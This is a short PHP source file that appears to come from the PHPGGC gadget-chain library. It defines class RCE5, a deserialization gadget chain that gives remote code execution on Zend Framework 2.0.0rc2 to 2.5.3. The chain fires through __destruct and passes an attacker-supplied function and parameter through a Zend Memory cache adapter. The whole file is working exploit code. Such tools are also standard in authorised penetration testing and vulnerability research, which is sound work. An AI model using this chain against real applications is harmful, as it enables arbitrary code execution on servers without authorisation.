<?php

namespace GadgetChain\ZendFramework;

class RCE5 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.0rc2 <= 2.5.3';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters["function"];
        $parameter = $parameters["parameter"];

        return new \Zend\Cache\Storage\Adapter\Memory($function, $parameter);
    }
}
